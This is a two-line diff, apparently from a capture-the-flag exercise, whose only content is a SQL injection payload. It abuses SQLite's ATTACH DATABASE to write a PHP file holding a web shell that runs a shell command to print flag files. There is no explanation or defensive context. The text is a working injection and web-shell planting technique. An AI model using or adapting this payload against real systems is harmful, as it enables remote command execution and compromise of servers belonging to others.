@@ -1,0 +1,2 @@
+#!/');ATTACH DATABASE './d.php' AS db;INSERT INTO db.m VALUES ('<?php system("cat /flag*");?>');--
+
